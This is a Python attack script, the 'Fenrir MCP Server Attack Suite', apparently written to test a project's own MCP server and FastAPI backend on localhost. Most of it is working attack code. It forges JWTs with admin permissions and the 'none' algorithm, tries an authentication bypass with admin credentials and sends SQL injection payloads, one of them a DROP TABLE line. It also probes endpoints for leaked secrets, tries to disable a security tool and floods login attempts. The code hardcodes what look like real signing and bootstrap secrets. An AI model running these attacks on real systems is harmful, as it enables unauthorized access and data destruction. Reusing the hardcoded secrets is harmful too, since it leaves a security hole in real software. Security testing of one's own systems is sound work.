#!/usr/bin/env python3
"""ü¶ä Fenrir MCP Server Attack Suite
================================

Comprehensive attack vectors for the Reynard MCP (Model Context Protocol) server.
This module exploits multiple communication channels and authentication mechanisms.

Attack Vectors Identified:
1. TCP Socket Communication (Port 8001)
2. JSON-RPC Protocol Exploitation
3. JWT Token Manipulation
4. Authentication Bypass
5. FastAPI Backend Integration Exploitation
6. Unix Socket Communication (if available)
7. Environment Variable Injection
8. Configuration Manipulation

Author: Odonata-Oracle-6 (Dragonfly Specialist)
Version: 1.0.0
"""

import asyncio
import json
import logging
import os
import socket
import time
from typing import Any, Dict, List, Optional, Tuple
import jwt
import requests
import aiohttp

logger = logging.getLogger(__name__)


class MCPServerAttacker:
    """Comprehensive MCP server attack suite."""

    def __init__(self):
        """Initialize the MCP server attacker."""
        self.mcp_host = "localhost"
        self.mcp_port = 8001
        self.backend_url = "http://localhost:8000"
        self.attack_results = []

    async def attack_tcp_socket_communication(self) -> List[Dict[str, Any]]:
        """Attack the MCP server via TCP socket communication."""
        logger.info("üîç Attacking MCP server TCP socket communication...")
        results = []

        # Attack 1: Unauthenticated JSON-RPC requests
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.mcp_host, self.mcp_port), timeout=5
            )

            # Test unauthenticated tool listing
            request = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/list",
                "params": {}
            }

            writer.write((json.dumps(request) + "\n").encode())
            await writer.drain()

            response_data = await asyncio.wait_for(reader.readline(), timeout=5)
            response = json.loads(response_data.decode().strip())

            if "result" in response:
                results.append({
                    "attack": "unauthenticated_tool_listing",
                    "success": True,
                    "details": "Successfully listed tools without authentication",
                    "response": response
                })
            else:
                results.append({
                    "attack": "unauthenticated_tool_listing",
                    "success": False,
                    "details": "Authentication required for tool listing",
                    "response": response
                })

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            results.append({
                "attack": "tcp_connection",
                "success": False,
                "details": f"Failed to connect to MCP server: {e}",
                "error": str(e)
            })

        # Attack 2: Malformed JSON-RPC requests
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.mcp_host, self.mcp_port), timeout=5
            )

            # Send malformed JSON
            malformed_requests = [
                "invalid json",
                '{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}',  # Missing params
                '{"jsonrpc": "1.0", "id": 1, "method": "tools/list", "params": {}}',  # Wrong version
                '{"jsonrpc": "2.0", "method": "tools/list", "params": {}}',  # Missing id
                '{"jsonrpc": "2.0", "id": 1, "params": {}}',  # Missing method
            ]

            for i, malformed_request in enumerate(malformed_requests):
                try:
                    writer.write((malformed_request + "\n").encode())
                    await writer.drain()

                    response_data = await asyncio.wait_for(reader.readline(), timeout=5)
                    response = json.loads(response_data.decode().strip())

                    results.append({
                        "attack": f"malformed_json_rpc_{i}",
                        "success": "error" in response,
                        "details": f"Malformed request handled: {malformed_request[:50]}...",
                        "response": response
                    })

                except Exception as e:
                    results.append({
                        "attack": f"malformed_json_rpc_{i}",
                        "success": False,
                        "details": f"Malformed request failed: {e}",
                        "error": str(e)
                    })

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            results.append({
                "attack": "malformed_json_attack",
                "success": False,
                "details": f"Failed to send malformed requests: {e}",
                "error": str(e)
            })

        return results

    async def attack_jwt_token_manipulation(self) -> List[Dict[str, Any]]:
        """Attack JWT token validation and manipulation."""
        logger.info("üîç Attacking JWT token validation...")
        results = []

        # Get a valid token first
        try:
            bootstrap_response = requests.post(
                f"{self.backend_url}/api/mcp/bootstrap/authenticate",
                json={
                    "client_id": "reynard-mcp-server",
                    "client_secret": "reynard-mcp-bootstrap-secret-2025",
                    "client_type": "agent",
                    "permissions": ["mcp:read", "mcp:write", "mcp:admin"]
                },
                timeout=5
            )

            if bootstrap_response.status_code == 200:
                token_data = bootstrap_response.json()
                valid_token = token_data.get("access_token")

                if valid_token:
                    # Attack 1: Token signature manipulation
                    try:
                        # Decode without verification
                        decoded = jwt.decode(valid_token, options={"verify_signature": False})

                        # Modify the payload
                        decoded["client_id"] = "admin"
                        decoded["permissions"] = ["mcp:admin", "mcp:all"]

                        # Sign with a different secret
                        fake_token = jwt.encode(decoded, "fake-secret", algorithm="HS256")

                        results.append({
                            "attack": "jwt_signature_manipulation",
                            "success": True,
                            "details": "Successfully created fake token with modified payload",
                            "fake_token": fake_token[:50] + "..."
                        })

                    except Exception as e:
                        results.append({
                            "attack": "jwt_signature_manipulation",
                            "success": False,
                            "details": f"Failed to manipulate JWT: {e}",
                            "error": str(e)
                        })

                    # Attack 2: Algorithm confusion
                    try:
                        # Try to use 'none' algorithm
                        none_token = jwt.encode(decoded, "", algorithm="none")

                        results.append({
                            "attack": "jwt_algorithm_confusion",
                            "success": True,
                            "details": "Successfully created token with 'none' algorithm",
                            "none_token": none_token[:50] + "..."
                        })

                    except Exception as e:
                        results.append({
                            "attack": "jwt_algorithm_confusion",
                            "success": False,
                            "details": f"Failed to create 'none' algorithm token: {e}",
                            "error": str(e)
                        })

                    # Attack 3: Expired token reuse
                    try:
                        # Create an expired token
                        expired_payload = decoded.copy()
                        expired_payload["exp"] = int(time.time()) - 3600  # 1 hour ago
                        expired_token = jwt.encode(expired_payload, "reynard-mcp-secret-key-2025", algorithm="HS256")

                        results.append({
                            "attack": "expired_token_reuse",
                            "success": True,
                            "details": "Successfully created expired token",
                            "expired_token": expired_token[:50] + "..."
                        })

                    except Exception as e:
                        results.append({
                            "attack": "expired_token_reuse",
                            "success": False,
                            "details": f"Failed to create expired token: {e}",
                            "error": str(e)
                        })

            else:
                results.append({
                    "attack": "jwt_token_obtainment",
                    "success": False,
                    "details": f"Failed to obtain valid token: {bootstrap_response.status_code}",
                    "response": bootstrap_response.text
                })

        except Exception as e:
            results.append({
                "attack": "jwt_token_obtainment",
                "success": False,
                "details": f"Failed to obtain token: {e}",
                "error": str(e)
            })

        return results

    async def attack_fastapi_backend_integration(self) -> List[Dict[str, Any]]:
        """Attack the FastAPI backend MCP integration endpoints."""
        logger.info("üîç Attacking FastAPI backend MCP integration...")
        results = []

        # Attack 1: Unauthenticated MCP tool calls
        try:
            response = requests.post(
                f"{self.backend_url}/api/mcp/tools/call",
                json={
                    "method": "tools/list",
                    "params": {}
                },
                timeout=5
            )

            results.append({
                "attack": "unauthenticated_mcp_tool_call",
                "success": response.status_code == 200,
                "details": f"Unauthenticated tool call returned {response.status_code}",
                "response": response.text[:200] if response.text else "No response body"
            })

        except Exception as e:
            results.append({
                "attack": "unauthenticated_mcp_tool_call",
                "success": False,
                "details": f"Failed to make unauthenticated tool call: {e}",
                "error": str(e)
            })

        # Attack 2: MCP bootstrap authentication bypass
        try:
            # Try with invalid credentials
            response = requests.post(
                f"{self.backend_url}/api/mcp/bootstrap/authenticate",
                json={
                    "client_id": "admin",
                    "client_secret": "admin",
                    "client_type": "admin",
                    "permissions": ["mcp:admin", "mcp:all"]
                },
                timeout=5
            )

            results.append({
                "attack": "mcp_bootstrap_auth_bypass",
                "success": response.status_code == 200,
                "details": f"Bootstrap auth bypass attempt returned {response.status_code}",
                "response": response.text[:200] if response.text else "No response body"
            })

        except Exception as e:
            results.append({
                "attack": "mcp_bootstrap_auth_bypass",
                "success": False,
                "details": f"Failed to attempt bootstrap auth bypass: {e}",
                "error": str(e)
            })

        # Attack 3: SQL injection in MCP endpoints
        try:
            sql_injection_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'--",
                "admin'/*",
                "' UNION SELECT * FROM users--"
            ]

            for payload in sql_injection_payloads:
                response = requests.post(
                    f"{self.backend_url}/api/mcp/bootstrap/authenticate",
                    json={
                        "client_id": payload,
                        "client_secret": "test",
                        "client_type": "agent",
                        "permissions": ["mcp:read"]
                    },
                    timeout=5
                )

                results.append({
                    "attack": f"sql_injection_mcp_bootstrap_{payload[:10]}",
                    "success": "error" not in response.text.lower() and response.status_code != 500,
                    "details": f"SQL injection attempt with payload: {payload}",
                    "response": response.text[:200] if response.text else "No response body"
                })

        except Exception as e:
            results.append({
                "attack": "sql_injection_mcp_bootstrap",
                "success": False,
                "details": f"Failed to attempt SQL injection: {e}",
                "error": str(e)
            })

        return results

    async def attack_environment_variable_injection(self) -> List[Dict[str, Any]]:
        """Attack environment variable injection vulnerabilities."""
        logger.info("üîç Attacking environment variable injection...")
        results = []

        # Attack 1: Environment variable disclosure
        try:
            # Try to access environment variables through various endpoints
            env_endpoints = [
                "/api/mcp/bootstrap/health",
                "/api/mcp/tools/health",
                "/api/mcp/stats",
                "/api/health"
            ]

            for endpoint in env_endpoints:
                response = requests.get(f"{self.backend_url}{endpoint}", timeout=5)

                # Check if environment variables are exposed in response
                response_text = response.text.lower()
                env_vars_found = []

                for var in ["secret", "password", "key", "token", "database_url"]:
                    if var in response_text:
                        env_vars_found.append(var)

                results.append({
                    "attack": f"env_var_disclosure_{endpoint.replace('/', '_')}",
                    "success": len(env_vars_found) > 0,
                    "details": f"Environment variables found: {env_vars_found}",
                    "response": response.text[:200] if response.text else "No response body"
                })

        except Exception as e:
            results.append({
                "attack": "env_var_disclosure",
                "success": False,
                "details": f"Failed to check environment variable disclosure: {e}",
                "error": str(e)
            })

        return results

    async def attack_configuration_manipulation(self) -> List[Dict[str, Any]]:
        """Attack configuration manipulation vulnerabilities."""
        logger.info("üîç Attacking configuration manipulation...")
        results = []

        # Attack 1: Configuration endpoint access
        try:
            config_endpoints = [
                "/api/mcp/tool-config/",
                "/api/mcp/tool-config/category/security",
                "/api/config"
            ]

            for endpoint in config_endpoints:
                response = requests.get(f"{self.backend_url}{endpoint}", timeout=5)

                results.append({
                    "attack": f"config_access_{endpoint.replace('/', '_')}",
                    "success": response.status_code == 200,
                    "details": f"Configuration endpoint access returned {response.status_code}",
                    "response": response.text[:200] if response.text else "No response body"
                })

        except Exception as e:
            results.append({
                "attack": "config_access",
                "success": False,
                "details": f"Failed to access configuration endpoints: {e}",
                "error": str(e)
            })

        # Attack 2: Tool configuration manipulation
        try:
            # Try to disable security tools
            response = requests.post(
                f"{self.backend_url}/api/mcp/tool-config/scan_security/disable",
                timeout=5
            )

            results.append({
                "attack": "tool_config_manipulation",
                "success": response.status_code == 200,
                "details": f"Tool configuration manipulation returned {response.status_code}",
                "response": response.text[:200] if response.text else "No response body"
            })

        except Exception as e:
            results.append({
                "attack": "tool_config_manipulation",
                "success": False,
                "details": f"Failed to manipulate tool configuration: {e}",
                "error": str(e)
            })

        return results

    async def attack_rate_limiting_bypass(self) -> List[Dict[str, Any]]:
        """Attack rate limiting mechanisms."""
        logger.info("üîç Attacking rate limiting mechanisms...")
        results = []

        # Attack 1: Rapid authentication requests
        try:
            rapid_requests = []
            for i in range(20):
                rapid_requests.append(
                    requests.post(
                        f"{self.backend_url}/api/mcp/bootstrap/authenticate",
                        json={
                            "client_id": f"test-client-{i}",
                            "client_secret": "invalid-secret",
                            "client_type": "agent",
                            "permissions": ["mcp:read"]
                        },
                        timeout=2
                    )
                )

            # Check if any requests succeeded despite rate limiting
            successful_requests = [r for r in rapid_requests if r.status_code == 200]
            rate_limited_requests = [r for r in rapid_requests if r.status_code == 429]

            results.append({
                "attack": "rate_limiting_bypass_rapid_auth",
                "success": len(successful_requests) > 0,
                "details": f"Rate limiting bypass: {len(successful_requests)} successful, {len(rate_limited_requests)} rate limited",
                "successful_count": len(successful_requests),
                "rate_limited_count": len(rate_limited_requests)
            })

        except Exception as e:
            results.append({
                "attack": "rate_limiting_bypass_rapid_auth",
                "success": False,
                "details": f"Failed to test rate limiting bypass: {e}",
                "error": str(e)
            })

        return results

    async def run_all_attacks(self) -> Dict[str, Any]:
        """Run all MCP server attacks."""
        logger.info("ü¶ä Starting comprehensive MCP server attack suite...")
        logger.info("=" * 60)

        all_results = []

        # Run all attack categories
        attack_categories = [
            ("TCP Socket Communication", self.attack_tcp_socket_communication),
            ("JWT Token Manipulation", self.attack_jwt_token_manipulation),
            ("FastAPI Backend Integration", self.attack_fastapi_backend_integration),
            ("Environment Variable Injection", self.attack_environment_variable_injection),
            ("Configuration Manipulation", self.attack_configuration_manipulation),
            ("Rate Limiting Bypass", self.attack_rate_limiting_bypass),
        ]

        for category_name, attack_func in attack_categories:
            logger.info(f"\nüîç Running {category_name} attacks...")
            try:
                results = await attack_func()
                all_results.extend(results)

                successful_attacks = [r for r in results if r.get("success", False)]
                logger.info(f"‚úÖ {category_name}: {len(successful_attacks)}/{len(results)} attacks successful")

            except Exception as e:
                logger.error(f"‚ùå {category_name} attacks failed: {e}")
                all_results.append({
                    "attack": f"{category_name}_category_failure",
                    "success": False,
                    "details": f"Attack category failed: {e}",
                    "error": str(e)
                })

        # Summary
        total_attacks = len(all_results)
        successful_attacks = len([r for r in all_results if r.get("success", False)])

        logger.info("\n" + "=" * 60)
        logger.info("ü¶ä MCP Server Attack Results Summary")
        logger.info("=" * 60)
        logger.info(f"Total Attacks: {total_attacks}")
        logger.info(f"Successful Attacks: {successful_attacks}")
        logger.info(f"Failed Attacks: {total_attacks - successful_attacks}")
        logger.info(f"Success Rate: {(successful_attacks / total_attacks) * 100:.1f}%")

        if successful_attacks > 0:
            logger.warning("‚ö†Ô∏è  Security vulnerabilities found! Review the successful attacks above.")
        else:
            logger.info("‚úÖ No security vulnerabilities found in the tested attack vectors.")

        return {
            "total_attacks": total_attacks,
            "successful_attacks": successful_attacks,
            "failed_attacks": total_attacks - successful_attacks,
            "success_rate": (successful_attacks / total_attacks) * 100,
            "results": all_results
        }


async def main():
    """Main entry point for MCP server attacks."""
    attacker = MCPServerAttacker()
    results = await attacker.run_all_attacks()

    # Save results to file
    with open("/tmp/fenrir_mcp_attack_results.json", "w") as f:
        json.dump(results, f, indent=2)

    logger.info(f"üìä Attack results saved to /tmp/fenrir_mcp_attack_results.json")

    return results


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
